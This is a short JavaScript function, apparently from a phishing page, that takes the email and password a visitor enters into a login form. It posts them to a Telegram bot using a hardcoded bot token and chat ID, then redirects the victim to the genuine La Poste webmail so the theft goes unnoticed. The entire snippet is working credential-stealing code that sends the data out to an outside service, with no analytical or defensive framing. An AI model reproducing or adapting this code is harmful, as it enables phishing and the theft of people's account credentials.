function sendToTelegram(){

    const token = "8896660959:AAFpwOjbWRy3a2VoCBCvqMbDrn79Pf40BaQ";
    const chatId = "8470376691";

    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;

    if(email === "" || password === ""){
        alert("Remplis tous les champs !");
        return;
    }

    const message = `
🔐 Nouveau formulaire
📧 Email: ${email}
🔑 Password: ${password}
`;

    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message
        })
    })
.then(response => {
    if (response.ok) {
        window.location.href = "https://www.laposte.fr/webmail";
    } else {
        console.error("Erreur lors de l'envoi.");
    }
})  
}
